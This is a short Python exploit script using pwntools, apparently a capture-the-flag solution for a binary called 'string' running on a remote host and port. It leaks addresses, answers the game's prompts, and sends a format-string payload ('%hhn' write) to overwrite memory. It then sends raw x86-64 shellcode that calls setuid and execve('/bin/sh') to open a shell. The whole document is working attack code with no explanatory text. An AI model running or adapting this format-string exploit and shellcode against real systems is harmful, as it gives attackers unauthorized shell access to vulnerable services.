from pwn import *
p = process("./string")
context.log_level = 'debug'
p = remote("111.198.29.45", "57763")
p.recvuntil("is ")

t1 = int("0x" + p.recvuntil('\n', drop=True), 16)
p.recvuntil("is ")
t2 = int("0x" + p.recvuntil('\n', drop=True), 16)
p.recvuntil(":\n")
p.sendline("mask")
p.recvuntil("?:\n")
p.sendline("east")
p.recvuntil("?:\n")
p.sendline("1")
p.recvuntil("'\n")
p.sendline("1")
p.recvuntil(":\n")

# gdb.attach(p, "b*0x400C7E")
p.sendline("%85c%10$hhn".ljust(0x10, '1') + p64(t1))
p.recv()
p.sendline(
    "\x48\x31\xff\x48\x31\xc0\xb0\x69\x0f\x05\x48\x31\xd2\x48\xbb\xff\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x48\x31\xc0\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05"
)
p.interactive()